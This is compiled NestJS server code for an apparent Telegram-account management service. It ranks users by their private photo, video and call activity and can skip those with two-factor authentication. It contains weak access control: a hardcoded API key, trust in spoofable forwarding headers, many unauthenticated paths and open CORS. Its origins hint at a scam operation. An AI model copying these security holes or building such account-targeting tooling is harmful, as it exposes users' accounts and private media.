                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getTopInteractionUsers(options) {
        const { page = 1, limit = 20, minScore = 0, minCalls = 0, minPhotos = 0, minVideos = 0, excludeExpired = true, excludeTwoFA = false, gender } = options;
        const pageNum = Math.max(1, Math.floor(page));
        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
        const skip = (pageNum - 1) * limitNum;
        const weights = {
            ownPhoto: 15,
            ownVideo: 18,
            otherPhoto: 3,
            otherVideo: 5,
            totalPhoto: 2,
            totalVideo: 3,
            incomingCall: 5,
            outgoingCall: 3,
            videoCall: 8,
            totalCalls: 1,
            movieCount: -5,
        };
        const filter = {};
        if (excludeExpired) {
            filter.expired = { $ne: true };
        }
        if (excludeTwoFA) {
            filter.twoFA = { $ne: true };
        }
        if (gender) {
            filter.gender = gender;
        }
        if (minCalls > 0) {
            filter['calls.totalCalls'] = { $gte: minCalls };
        }
        if (minPhotos > 0) {
            filter.$or = [
                { photoCount: { $gte: minPhotos } },
                { ownPhotoCount: { $gte: minPhotos } },
                { otherPhotoCount: { $gte: minPhotos } }
            ];
        }
        if (minVideos > 0) {
            filter.$or = [
                ...(filter.$or || []),
                { videoCount: { $gte: minVideos } },
                { ownVideoCount: { $gte: minVideos } },
                { otherVideoCount: { $gte: minVideos } }
            ];
        }
        const pipeline = [
            { $match: filter },
            {
                $lookup: {
                    from: 'session_audits',
                    localField: 'mobile',
                    foreignField: 'mobile',
                    as: 'sessionAudits'
                }
            },
            {
                $match: {
                    sessionAudits: { $size: 0 }
                }
            },
            {
                $project: {
                    sessionAudits: 0
                }
            },
            {
                $addFields: {
                    photoScore: {
                        $cond: {
                            if: { $gt: ['$ownPhotoCount', 0] },
                            then: { $multiply: ['$ownPhotoCount', weights.ownPhoto] },
                            else: {
                                $cond: {
                                    if: { $gt: ['$otherPhotoCount', 0] },
                                    then: { $multiply: ['$otherPhotoCount', weights.otherPhoto] },
                                    else: {
                                        $cond: {
                                            if: { $gt: ['$photoCount', 0] },
                                            then: { $multiply: ['$photoCount', weights.totalPhoto] },
                                            else: 0
                                        }
                                    }
                                }
                            }
                        }
                    },
                    videoScore: {
                        $cond: {
                            if: { $gt: ['$ownVideoCount', 0] },
                            then: { $multiply: ['$ownVideoCount', weights.ownVideo] },
                            else: {
                                $cond: {
                                    if: { $gt: ['$otherVideoCount', 0] },
                                    then: { $multiply: ['$otherVideoCount', weights.otherVideo] },
                                    else: {
                                        $cond: {
                                            if: { $gt: ['$videoCount', 0] },
                                            then: { $multiply: ['$videoCount', weights.totalVideo] },
                                            else: 0
                                        }
                                    }
                                }
                            }
                        }
                    },
                    callScore: {
                        $let: {
                            vars: {
                                incomingVal: { $ifNull: ['$calls.incoming', 0] },
                                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },
                                videoVal: { $ifNull: ['$calls.video', 0] },
                                totalCallsVal: { $ifNull: ['$calls.totalCalls', 0] }
                            },
                            in: {
                                $add: [
                                    {
                                        $cond: {
                                            if: { $gt: ['$$incomingVal', 0] },
                                            then: { $multiply: ['$$incomingVal', weights.incomingCall] },
                                            else: 0
                                        }
                                    },
                                    {
                                        $cond: {
                                            if: { $gt: ['$$outgoingVal', 0] },
                                            then: { $multiply: ['$$outgoingVal', weights.outgoingCall] },
                                            else: 0
                                        }
                                    },
                                    {
                                        $cond: {
                                            if: { $gt: ['$$videoVal', 0] },
                                            then: { $multiply: ['$$videoVal', weights.videoCall] },
                                            else: 0
                                        }
                                    },
                                    {
                                        $cond: {
                                            if: {
                                                $and: [
                                                    { $eq: ['$$incomingVal', 0] },
                                                    { $eq: ['$$outgoingVal', 0] },
                                                    { $gt: ['$$totalCallsVal', 0] }
                                                ]
                                            },
                                            then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },
                                            else: 0
                                        }
                                    }
                                ]
                            }
                        }
                    },
                    movieScore: {
                        $cond: {
                            if: { $gt: ['$movieCount', 0] },
                            then: { $multiply: ['$movieCount', weights.movieCount] },
                            else: 0
                        }
                    }
                }
            },
            {
                $addFields: {
                    interactionScore: {
                        $round: [
                            {
                                $divide: [
                                    {
                                        $add: [
                                            '$photoScore',
                                            '$videoScore',
                                            '$callScore',
                                            '$movieScore'
                                        ]
                                    },
                                    1
                                ]
                            },
                            2
                        ]
                    }
                }
            },
            {
                $match: {
                    interactionScore: { $gte: minScore }
                }
            },
            { $sort: { interactionScore: -1 } },
            {
                $group: {
                    _id: '$mobile',
                    doc: { $first: '$$ROOT' }
                }
            },
            {
                $replaceRoot: { newRoot: '$doc' }
            },
            { $sort: { interactionScore: -1 } },
            {
                $facet: {
                    totalCount: [{ $count: 'count' }],
                    paginatedResults: [
                        { $skip: skip },
                        { $limit: limitNum }
                    ]
                }
            },
            {
                $project: {
                    total: { $ifNull: [{ $arrayElemAt: ['$totalCount.count', 0] }, 0] },
                    users: '$paginatedResults'
                }
            }
        ];
        const result = await this.userModel.aggregate(pipeline, { allowDiskUse: true }).exec();
        if (!result || result.length === 0) {
            return {
                users: [],
                total: 0,
                page: pageNum,
                limit: limitNum,
                totalPages: 0
            };
        }
        const aggregationResult = result[0];
        const totalUsers = aggregationResult.total || 0;
        const users = aggregationResult.users || [];
        const cleanedUsers = users.map((user) => {
            const { photoScore, videoScore, callScore, movieScore, ...cleanUser } = user;
            return cleanUser;
        });
        const totalPages = Math.ceil(totalUsers / limitNum);
        return {
            users: cleanedUsers,
            total: totalUsers,
            page: pageNum,
            limit: limitNum,
            totalPages
        };
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService,
        bots_1.BotsService])
], UsersService);


/***/ }),

/***/ "./src/decorators/cloudflare-cache.decorator.ts":
/*!******************************************************!*\
  !*** ./src/decorators/cloudflare-cache.decorator.ts ***!
  \******************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CloudflareCache = exports.CLOUDFLARE_CACHE_KEY = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
exports.CLOUDFLARE_CACHE_KEY = 'cloudflare-cache-seconds';
const CloudflareCache = (edgeSeconds, browserSeconds = 0) => (0, common_1.SetMetadata)(exports.CLOUDFLARE_CACHE_KEY, {
    edge: edgeSeconds,
    browser: browserSeconds,
});
exports.CloudflareCache = CloudflareCache;


/***/ }),

/***/ "./src/decorators/index.ts":
/*!*********************************!*\
  !*** ./src/decorators/index.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./cloudflare-cache.decorator */ "./src/decorators/cloudflare-cache.decorator.ts"), exports);
__exportStar(__webpack_require__(/*! ./no-cache.decorator */ "./src/decorators/no-cache.decorator.ts"), exports);


/***/ }),

/***/ "./src/decorators/no-cache.decorator.ts":
/*!**********************************************!*\
  !*** ./src/decorators/no-cache.decorator.ts ***!
  \**********************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NoCache = exports.NO_CACHE_KEY = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
exports.NO_CACHE_KEY = 'NO_CACHE';
const NoCache = () => (0, common_1.SetMetadata)(exports.NO_CACHE_KEY, true);
exports.NoCache = NoCache;


/***/ }),

/***/ "./src/guards/auth.guard.ts":
/*!**********************************!*\
  !*** ./src/guards/auth.guard.ts ***!
  \**********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var AuthGuard_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AuthGuard = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils/index.ts");
const components_1 = __webpack_require__(/*! ../components */ "./src/components/index.ts");
const ALLOWED_IPS = [
    '31.97.59.2',
    '148.230.84.50',
    '13.228.225.19',
    '18.142.128.26',
    '54.254.162.138',
];
const ALLOWED_ORIGINS = [
    'https://paidgirl.site',
    'https://zomcall.netlify.app',
    'https://tgchats.netlify.app',
    'https://tg-chats.netlify.app',
    'https://report-upi.netlify.app',
].map((origin) => origin.toLowerCase());
const IGNORE_PATHS = [
    '/',
    '/exit',
    '/getProcessId',
    '/executehs',
    '/executehsl',
    '/sendmessage',
    '/asktopay',
    '/refreshmap',
    '/markasread',
    '/checktghealth',
    '/isRecentUser',
    '/paymentstats',
    '/sendtochannel',
    '/joinchannel',
    '/leavechannel',
    '/channelinfo',
    '/getme',
    '/trytoconnect',
    '/chat',
    '/builds',
    '/favicon.ico',
    /^\/userdata(?:$|\/)/i,
    /^\/favicon(?:$|\/)/i,
    /^\/favicon.ico(?:$|\/)/i,
    /^\/blockuserall(?:$|\/)/i,
    /^\/sendtoall(?:$|\/)/i,
    /^\/sendtochannel(?:$|\/)/i,
    /^\/apim(?:$|\/)/i,
    '/apim',
    '/health',
    /^\/public(?:$|\/)/i,
];
let AuthGuard = AuthGuard_1 = class AuthGuard {
    constructor() {
        this.logger = new utils_1.Logger(AuthGuard_1.name);
    }
    canActivate(context) {
        const request = context.switchToHttp().getRequest();
        const path = request.path;
        const url = request.url;
        const originalUrl = request.originalUrl;
        if (this.isIgnoredPath(path, url, originalUrl)) {
            return true;
        }
        const apiKey = request.headers['x-api-key']?.toString() ||
            request.query['apiKey']?.toString();
        const clientIp = this.extractRealClientIP(request);
        const origin = this.extractRealOrigin(request);
        this.logger.debug(`Request Received: ${originalUrl}`);
        let passedReason = null;
        if (apiKey && apiKey.toLowerCase() === 'santoor') {
            passedReason = 'API key valid';
        }
        else if (ALLOWED_IPS.includes(clientIp)) {
            passedReason = 'IP allowed';
        }
        else if (origin && this.isOriginAllowed(origin)) {
            passedReason = 'Origin allowed';
        }
        if (passedReason) {
            return true;
        }
        this.logger.warn(` Access denied  no condition satisfied`);
        this.notifyUnauthorized(clientIp, origin, originalUrl);
        throw new common_1.UnauthorizedException('Access denied');
    }
    isIgnoredPath(...urls) {
        for (const urlToTest of urls.filter(Boolean)) {
            for (const ignore of IGNORE_PATHS) {
                if (typeof ignore === 'string') {
                    if (ignore.toLowerCase() === urlToTest.toLowerCase()) {
                        return true;
                    }
                }
                else if (ignore.test(urlToTest)) {
                    return true;
                }
            }
        }
        return false;
    }
    isOriginAllowed(origin) {
        try {
            const { protocol, host } = new URL(origin.toLowerCase().trim());
            const normalized = `${protocol}//${host}`;
            return ALLOWED_ORIGINS.includes(normalized);
        }
        catch {
            return false;
        }
    }
    getHeaderValue(request, headerName) {
        return request.headers[headerName.toLowerCase()];
    }
    extractRealClientIP(request) {
        const cfConnectingIP = this.getHeaderValue(request, 'cf-connecting-ip');
        if (cfConnectingIP)
            return cfConnectingIP;
        const xRealIP = this.getHeaderValue(request, 'x-real-ip');
        if (xRealIP)
            return xRealIP;
        const xForwardedFor = this.getHeaderValue(request, 'x-forwarded-for');
        if (xForwardedFor)
            return xForwardedFor.split(',')[0].trim();
        if (request.ip)
            return request.ip.replace('::ffff:', '');
        if (request.connection?.remoteAddress)
            return request.connection.remoteAddress.replace('::ffff:', '');
        this.logger.warn(`Unable to extract client IP`);
        return 'unknown';
    }
    extractRealOrigin(request) {
        const origin = this.getHeaderValue(request, 'origin');
        if (origin)
            return origin;
        const xOriginalHost = this.getHeaderValue(request, 'x-original-host');
        if (xOriginalHost)
            return `${this.extractProtocol(request)}://${xOriginalHost}`;
        const xForwardedHost = this.getHeaderValue(request, 'x-forwarded-host');
        if (xForwardedHost)
            return `${this.extractProtocol(request)}://${xForwardedHost}`;
        const host = this.getHeaderValue(request, 'host');
        if (host)
            return `${this.extractProtocol(request)}://${host}`;
        const referer = this.getHeaderValue(request, 'referer');
        if (referer) {
            try {
                const refererUrl = new URL(referer);
                return `${refererUrl.protocol}//${refererUrl.host}`;
            }
            catch {
                this.logger.debug(`Invalid referer: ${referer}`);
            }
        }
        return undefined;
    }
    extractProtocol(request) {
        const xForwardedProto = this.getHeaderValue(request, 'x-forwarded-proto');
        if (xForwardedProto)
            return xForwardedProto.toLowerCase();
        const cfVisitor = this.getHeaderValue(request, 'cf-visitor');
        if (cfVisitor) {
            try {
                const visitor = JSON.parse(cfVisitor);
                if (visitor.scheme)
                    return visitor.scheme.toLowerCase();
            }
            catch {
                this.logger.debug(`Failed to parse CF-Visitor`);
            }
        }
        if (request.secure)
            return 'https';
        const xForwardedSsl = this.getHeaderValue(request, 'x-forwarded-ssl');
        if (xForwardedSsl?.toLowerCase() === 'on')
            return 'https';
        return  false ? 0 : 'http';
    }
    notifyUnauthorized(clientIp, origin, originalUrl) {
        try {
            const botsService = (0, utils_1.getBotsServiceInstance)();
            if (!botsService) {
                this.logger.warn(`BotsService instance not available for notifications`);
                return;
            }
            else {
                botsService.sendMessageByCategory(components_1.ChannelCategory.UNAUTH_CALLS, `Unauthorized Attempt\nip: ${clientIp || 'unknown IP'}\norigin: ${origin || 'unknown origin'}\npath: ${originalUrl || 'unknown path'}`);
                return;
            }
        }
        catch (err) {
            this.logger.error(`Notifbot failed: ${err.message}`);
        }
    }
};
exports.AuthGuard = AuthGuard;
exports.AuthGuard = AuthGuard = AuthGuard_1 = __decorate([
    (0, common_1.Injectable)()
], AuthGuard);


/***/ }),

/***/ "./src/guards/index.ts":
/*!*****************************!*\
  !*** ./src/guards/index.ts ***!
  \*****************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./auth.guard */ "./src/guards/auth.guard.ts"), exports);


/***/ }),

/***/ "./src/interceptors/Exception-filter.ts":
/*!**********************************************!*\
  !*** ./src/interceptors/Exception-filter.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ExceptionsFilter = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils/index.ts");
let ExceptionsFilter = class ExceptionsFilter {
    catch(exception, host) {
        const ctx = host.switchToHttp();
        const response = ctx.getResponse();
        const errorDetails = (0, utils_1.parseError)(exception, 'Exception', false);
        console.error("stack:", exception["stack"]);
        let status = errorDetails.status || common_1.HttpStatus.INTERNAL_SERVER_ERROR;
        let message = errorDetails.message || 'Internal server error';
        if (exception instanceof common_1.HttpException) {
            status = exception.getStatus();
            const errorResponse = exception.getResponse();
            message =
                typeof errorResponse === 'string'
                    ? errorResponse
                    : errorResponse.message || errorResponse;
        }
        response.status(status).json({
            statusCode: status,
            message,
            error: errorDetails.error
        });
    }
};
exports.ExceptionsFilter = ExceptionsFilter;
exports.ExceptionsFilter = ExceptionsFilter = __decorate([
    (0, common_1.Catch)()
], ExceptionsFilter);


/***/ }),

/***/ "./src/interceptors/cloudflare-cache.interceptor.ts":
/*!**********************************************************!*\
  !*** ./src/interceptors/cloudflare-cache.interceptor.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CloudflareCacheInterceptor = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const core_1 = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
const decorators_1 = __webpack_require__(/*! ../decorators */ "./src/decorators/index.ts");
const decorators_2 = __webpack_require__(/*! ../decorators */ "./src/decorators/index.ts");
let CloudflareCacheInterceptor = class CloudflareCacheInterceptor {
    constructor(reflector) {
        this.reflector = reflector;
    }
    intercept(context, next) {
        const res = context.switchToHttp().getResponse();
        const noCache = this.reflector.get(decorators_2.NO_CACHE_KEY, context.getHandler());
        if (noCache) {
            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
            return next.handle();
        }
        const cacheConfig = this.reflector.get(decorators_1.CLOUDFLARE_CACHE_KEY, context.getHandler());
        if (cacheConfig) {
            res.setHeader('Cache-Control', `public, max-age=${cacheConfig.browser}, s-maxage=${cacheConfig.edge}`);
        }
        return next.handle();
    }
};
exports.CloudflareCacheInterceptor = CloudflareCacheInterceptor;
exports.CloudflareCacheInterceptor = CloudflareCacheInterceptor = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [core_1.Reflector])
], CloudflareCacheInterceptor);


/***/ }),

/***/ "./src/interceptors/index.ts":
/*!***********************************!*\
  !*** ./src/interceptors/index.ts ***!
  \***********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./cloudflare-cache.interceptor */ "./src/interceptors/cloudflare-cache.interceptor.ts"), exports);
__exportStar(__webpack_require__(/*! ./Exception-filter */ "./src/interceptors/Exception-filter.ts"), exports);
__exportStar(__webpack_require__(/*! ./timeout.interceptor */ "./src/interceptors/timeout.interceptor.ts"), exports);


/***/ }),

/***/ "./src/interceptors/timeout.interceptor.ts":
/*!*************************************************!*\
  !*** ./src/interceptors/timeout.interceptor.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimeoutInterceptor = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const rxjs_1 = __webpack_require__(/*! rxjs */ "rxjs");
const operators_1 = __webpack_require__(/*! rxjs/operators */ "rxjs/operators");
let TimeoutInterceptor = class TimeoutInterceptor {
    constructor(defaultTimeout = 120000) {
        this.defaultTimeout = defaultTimeout;
    }
    intercept(context, next) {
        return next.handle().pipe((0, operators_1.timeout)(this.defaultTimeout), (0, operators_1.catchError)((err) => {
            if (err.name === 'TimeoutError') {
                return (0, rxjs_1.throwError)(() => new common_1.RequestTimeoutException('Request timed out'));
            }
            return (0, rxjs_1.throwError)(() => err);
        }));
    }
};
exports.TimeoutInterceptor = TimeoutInterceptor;
exports.TimeoutInterceptor = TimeoutInterceptor = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [Number])
], TimeoutInterceptor);


/***/ }),

/***/ "./src/interfaces/telegram.ts":
/*!************************************!*\
  !*** ./src/interfaces/telegram.ts ***!
  \************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PrivacyLevelEnum = void 0;
var PrivacyLevelEnum;
(function (PrivacyLevelEnum) {
    PrivacyLevelEnum["everybody"] = "everybody";
    PrivacyLevelEnum["contacts"] = "contacts";
    PrivacyLevelEnum["nobody"] = "nobody";
})(PrivacyLevelEnum || (exports.PrivacyLevelEnum = PrivacyLevelEnum = {}));


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const processListeners_1 = __webpack_require__(/*! ./processListeners */ "./src/processListeners.ts");
(0, processListeners_1.setProcessListeners)();
__webpack_require__(/*! reflect-metadata */ "reflect-metadata");
const core_1 = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
const mongoose_1 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const app_module_1 = __webpack_require__(/*! ./app.module */ "./src/app.module.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const Exception_filter_1 = __webpack_require__(/*! ./interceptors/Exception-filter */ "./src/interceptors/Exception-filter.ts");
const timeout_interceptor_1 = __webpack_require__(/*! ./interceptors/timeout.interceptor */ "./src/interceptors/timeout.interceptor.ts");
async function bootstrap() {
    try {
        const app = await core_1.NestFactory.create(app_module_1.AppModule);
        const config = new swagger_1.DocumentBuilder()
            .setTitle('NestJS and Express API')
            .setDescription('API documentation')
            .setVersion('1.0')
            .addApiKey({ type: 'apiKey', name: 'x-api-key', in: 'header' }, 'x-api-key')
            .build();
        app.enableCors({
            allowedHeaders: "*",
            origin: "*"
        });
        const document = swagger_1.SwaggerModule.createDocument(app, config, {
            deepScanRoutes: true,
        });
        document.components ??= {};
        document.components.securitySchemes ??= {};
        document.security = [{ 'x-api-key': [] }];
        fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));
        swagger_1.SwaggerModule.setup('apim', app, document, {
            swaggerOptions: {
                persistAuthorization: true,
                authAction: {
                    'x-api-key': {
                        name: 'x-api-key',
                        schema: { type: 'apiKey', in: 'header', name: 'x-api-key' },
                        value: process.env.API_KEY || 'santoor',
                    },
                },
            },
        });
        mongoose_1.default.set('debug', true);
        app.useGlobalFilters(new Exception_filter_1.ExceptionsFilter());
        app.useGlobalInterceptors(new timeout_interceptor_1.TimeoutInterceptor(60000));
        app.useGlobalPipes(new common_1.ValidationPipe({
            transform: true,
            transformOptions: {
                enableImplicitConversion: true
            },
        }));
        await app.init();
        await app.listen(process.env.PORT || 9002);
        console.log(`Application is running on: http://localhost:${process.env.PORT || 9002}`);
    }
    catch (error) {
        console.error('Error during application bootstrap:', error);
        process.exit(1);
    }
}
bootstrap();


/***/ }),

/***/ "./src/middlewares/logger.middleware.ts":
/*!**********************************************!*\
  !*** ./src/middlewares/logger.middleware.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.LoggerMiddleware = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils/index.ts");
const components_1 = __webpack_require__(/*! ../components */ "./src/components/index.ts");
let LoggerMiddleware = class LoggerMiddleware {
    constructor() {
        this.logger = new utils_1.Logger('HTTP');
    }
    use(req, res, next) {
        const { method, originalUrl } = req;
        const startTime = Date.now();
        const ip = req.ip;
        const excludedEndpoints = [
            '/sendtochannel',
            '/favicon.',
            '/tgsignup',
            '/timestamps',
        ];
        const isExcluded = (url) => excludedEndpoints.some((endpoint) => url.startsWith(endpoint));
        if (!isExcluded(originalUrl) && originalUrl !== '/') {
            res.on('finish', () => {
                const { statusCode } = res;
                const duration = Date.now() - startTime;
                const durationStr = duration >= 1000 ? `${(duration / 1000).toFixed(2)}s` : `${duration}ms`;
                const botsService = (0, utils_1.getBotsServiceInstance)();
                if (!botsService) {
                    this.logger.warn(`BotsService instance not available for notifications`);
                    return;
                }
                if (statusCode >= 500) {
                    botsService.sendMessageByCategory(components_1.ChannelCategory.HTTP_FAILURES, `Threw Status ${statusCode} for ${originalUrl}`);
                    this.logger.error(`${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`);
                }
                else if (statusCode >= 400) {
                    botsService.sendMessageByCategory(components_1.ChannelCategory.HTTP_FAILURES, `Threw Status ${statusCode} for ${originalUrl}`);
                    this.logger.warn(`${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`);
                }
                else if (statusCode >= 300) {
                    this.logger.verbose(`${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`);
                }
